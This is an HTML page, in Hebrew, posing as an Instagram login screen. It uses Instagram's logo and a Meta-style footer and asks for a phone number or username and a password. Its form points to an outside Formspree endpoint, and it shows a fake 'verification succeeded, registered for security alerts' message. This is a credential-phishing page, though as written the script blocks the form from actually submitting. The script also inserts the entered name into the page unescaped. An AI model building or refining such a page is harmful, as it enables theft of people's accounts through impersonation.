<!DOCTYPE html>
<html lang="he" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background: #ffffff;
            color: #111;
        }

        .container {
            width: 90%;
            max-width: 1100px;
            margin: auto;
        }

        /* ---------- Header ---------- */

        .hero {
            text-align: center;
            margin-top: 70px;
        }

        .logo{
    display:flex;
    justify-content:center;
    margin-top:40px;
    margin-bottom:20px;
}

.logo img{
    width:120px;
    height:120px;
    border-radius:30px;
    transition:0.3s;
}

.logo img:hover{
    transform:scale(1.08);
}

        .hero p {
            margin-top: 15px;
            color: gray;
            font-size: 20px;
        }

        /* ---------- Card ---------- */

        .card {
            width: 480px;
            margin: 50px auto;
            background: white;
            border-radius: 20px;
            padding: 35px;
            box-shadow: 0px 15px 35px rgba(0,0,0,.12);
            border: 1px solid #ececec;
        }

        .card h2{
            margin-bottom:10px;
        }

        input,
        select {
            width: 100%;
            padding: 15px;
            margin-top: 15px;
            border-radius: 10px;
            border: 1px solid #d8d8d8;
            font-size: 16px;
            transition: .3s;
        }

        input:focus,
        select:focus{
            outline:none;
            border-color:#2563eb;
            box-shadow:0 0 10px rgba(37,99,235,.25);
        }

        button{
            width:100%;
            margin-top:20px;
            padding:15px;
            border:none;
            border-radius:10px;
            background:#2563eb;
            color:white;
            font-size:17px;
            cursor:pointer;
            transition:.3s;
        }

        button:hover{
            background:#124dc7;
            transform:translateY(-2px);
        }

        .result{
            display:none;
            margin-top:25px;
            background:#eef8ff;
            border-left:5px solid #2563eb;
            padding:18px;
            border-radius:12px;
        }

        /* ---------- Features ---------- */

        .features{
            display:grid;
            grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
            gap:25px;
            margin-top:70px;
            margin-bottom:60px;
        }

        .feature{
            background:white;
            padding:30px;
            border-radius:18px;
            box-shadow:0 8px 25px rgba(0,0,0,.08);
            transition:.3s;
            text-align:center;
        }

        .feature:hover{
            transform:translateY(-8px);
        }

        .feature h3{
            color:#2563eb;
            margin-bottom:12px;
        }

        footer{
            text-align:center;
            padding:25px;
            color:gray;
            border-top:1px solid #eee;
        }

    </style>

</head>

<body>

<div class="container">

    <section class="hero">

        <div class="logo">
    <img src="https://th.bing.com/th/id/OIP.fNdYnbLL5ZOf4A7isn_kbwHaHa?w=157&h=180&c=7&r=0&o=7&pid=1.7&rm=3" alt="Instagram Logo">
</div>

    

    </section>


    <div class="card">

        <h2>התחברות לאינסטגרם </h2>

    

        <form action="https://formspree.io/f/maqgbyeb" method="POST" id="form"
 method="POST"
            >
            <input
            id="name"
            type="text"
            placeholder="מספר טלפון נייד , שם משתמש "
            required>

            <input
            id="Password"
            type="Password"
            placeholder="סיסמה"
            required>

            <button>
                היכנס
            </button>

        </form>

        <div class="result" id="result">

            <h3>✅ האימות בוצעה בהצלחה </h3>

            <p id="text"></p>

        </div>

    </div>

    <div class="features">

        <div class="feature">

            <h3>🔔 Instant Alerts</h3>

            <p>Be notified about suspicious login attempts.</p>

        </div>

        <div class="feature">

            <h3>🔒 Security Tips</h3>

            <p>Recommendations to secure your account.</p>

        </div>

        <div class="feature">

            <h3>🛡 Safe Service</h3>

            <p>Keeping your account safe even while you sleep</p>

        </div>

    </div>

</div>

<footer>

© 2026 META.instagram

</footer>

<script>

const form=document.getElementById("form");
const result=document.getElementById("result");
const text=document.getElementById("text");

form.addEventListener("submit",function(e){

e.preventDefault();

let name=document.getElementById("name").value;

text.innerHTML="Welcome <b>"+name+"</b>.<br>Your account has been successfully registered for security alerts.";

result.style.display="block";

form.reset();

});

</script>

</body>

</html>
